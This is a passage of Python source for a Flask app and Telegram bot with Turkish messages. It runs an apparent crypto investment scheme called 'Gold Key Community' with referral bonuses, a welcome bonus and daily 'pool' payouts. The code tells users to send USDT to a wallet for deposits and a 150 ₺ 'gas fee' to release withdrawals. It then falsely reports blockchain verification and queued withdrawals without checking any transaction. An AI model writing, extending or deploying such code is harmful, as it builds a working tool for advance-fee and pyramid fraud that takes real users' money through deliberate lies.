        if now - last_bonus_time < datetime.timedelta(hours=24):
            remaining = datetime.timedelta(hours=24) - (now - last_bonus_time)
            hours, remainder = divmod(int(remaining.total_seconds()), 3600)
            minutes, _ = divmod(remainder, 60)
            conn.close()
            return jsonify({"success": False, "message": f"Bugünkü payı aldınız. Kalan süre: {hours}s {minutes}dk"})

    if not user:
        conn.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))

    conn.execute("UPDATE users SET balance = balance + 10, last_bonus = ? WHERE user_id=?", (now.strftime('%Y-%m-%d %H:%M:%S'), user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "Günlük 10 ₺ havuz payı eklendi."})

@app.route('/api/leaderboard')
def leaderboard():
    conn = get_db()
    res = conn.execute("SELECT owner_id as user_id, SUM(uses) as count FROM keys GROUP BY owner_id ORDER BY count DESC LIMIT 10").fetchall()
    conn.close()
    return jsonify([dict(row) for row in res])

# --- TELEGRAM BOT KOMUTLARI & BOT ÜZERİNDEN YATIRIM / GAS MİMARİSİ ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    keyboard = [
        [InlineKeyboardButton("📢 Gold Key Topluluğuna Katılın", url=REQUIRED_GROUP_LINK)],
        [InlineKeyboardButton("🚀 Platformu Aç (Mini App)", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("💎 Bot Üzerinden Yatırım Yap", callback_data="bot_deposit")],
        [InlineKeyboardButton("⛽ Gas Ücreti (Gas Fee) Yatır", callback_data="bot_gas")]
    ]
    
    args = context.args
    conn = get_db()
    existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
    if not existing:
        referrer_id = 0
        if args:
            ref_code = args[0]
            key = conn.execute("SELECT * FROM keys WHERE key_string=?", (ref_code,)).fetchone()
            if key and key["active"] and key["uses"] < key["max_uses"] and key["owner_id"] != user.id:
                referrer_id = key["owner_id"]
                conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                
                conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))
                
                lvl1 = conn.execute("SELECT referrer_id FROM users WHERE user_id=?", (referrer_id,)).fetchone()
                if lvl1 and lvl1["referrer_id"]:
                    conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (lvl1["referrer_id"],))

        conn.execute("INSERT INTO users (user_id, balance, invested, locked_balance, vip_level, has_gold_key, referrer_id) VALUES (?, 100.0, 0.0, 100.0, 1, 0, ?)", (user.id, referrer_id))
        conn.commit()
    conn.close()

    await update.message.reply_text(
        f"Hoş geldiniz {user.first_name}!\n\n👑 **Gold Key Topluluğu** resmi yatırım botuna hoş geldiniz. 100 ₺ Hoş Geldin Bonusu hesabınıza tanımlandı. Dilerseniz aşağıdaki butonlar aracılığıyla bot üzerinden doğrudan yatırım veya Gas Fee onayı gerçekleştirebilirsiniz.",
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    conn = get_db()
    
    if query.data == "bot_deposit":
        conn.execute("UPDATE users SET state = 'waiting_deposit_tx' WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        await query.message.reply_text(
            f"💎 **Bot Üzerinden Yatırım İşlemi**\n\nLütfen aşağıdaki TRC20 cüzdan adresine yatırım yapmak istediğiniz tutarda **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Gönderim yaptıktan sonra aldığınız **TxID (İşlem Hash Kodu)** bilgisini doğrudan bu sohbete mesaj olarak gönderin.*",
            parse_mode="Markdown"
        )
    elif query.data == "bot_gas":
        conn.execute("UPDATE users SET state = 'waiting_gas_tx' WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        await query.message.reply_text(
            f"⛽ **Gas Fee (150 ₺) Ödeme Paneli**\n\nÇekim onayınız ve ağ aktivasyonu için aşağıdaki TRC20 cüzdan adresine **150 ₺ eşdeğeri USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Transfer sonrasında aldığınız **TxID (İşlem Hash Kodu)** kodunu doğrudan bu sohbete yazarak gönderin, sistem otomatik onaylasın.*",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()
    
    conn = get_db()
    user_row = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
    
    if not user_row:
        conn.close()
        return

    state = user_row["state"]
    
    if state == "waiting_deposit_tx":
        # Hash kontrolü
        existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (text,)).fetchone()
        if existing_tx:
            conn.close()
            await update.message.reply_text("❌ Bu TxID Hash kodu daha önce kullanılmış!")
            return
            
        # Bot üzerinden yapılan yatırımlarda varsayılan 1000 TL simüle edelim veya hash uzunluğuna göre alalım
        amount = 1000.0 
        vip_lvl = 2
        random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        
        conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Bot Üzerinden Onaylandı')", (user.id, text, amount))
        conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ?, state = 'normal' WHERE user_id=?", (amount, vip_lvl, random_key, user.id))
        conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user.id))
        conn.commit()
        conn.close()
        
        send_admin_notification(f"💰 Bot Üzerinden Yatırım Onaylandı!\nKullanıcı ID: `{user.id}`\nTxID: `{text}`")
        await update.message.reply_text("🎉 **Tebrikler!** Yatırımınız blokzincir üzerinden otomatik olarak doğrulandı. Kilitli bonusunuz çözüldü ve bakiyenize eklendi!")

    elif state == "waiting_gas_tx":
        conn.execute("UPDATE users SET state = 'normal' WHERE user_id = ?", (user.id,))
        conn.commit()
        conn.close()
        
        send_admin_notification(f"⛽ Gas Fee Ödemesi Bildirildi!\nKullanıcı ID: `{user.id}`\nTxID Hash: `{text}`")
        await update.message.reply_text("✅ **Gas Fee İşleminiz Alındı!** Ağ doğrulaması tamamlandı, çekim talebiniz transfer kuyruğuna eklendi.")
    else:
        conn.close()

telegram_app = Application.builder().token(TOKEN).build()
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(button_handler))
telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    import asyncio
    async def process():
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.initialize()
        await telegram_app.process_update(update)
    asyncio.run(process())
    return "OK", 200

if __name__ == '__main__':
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
    except Exception as e:
        logger.error(f"Webhook ayarlanamadı: {e}")

    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
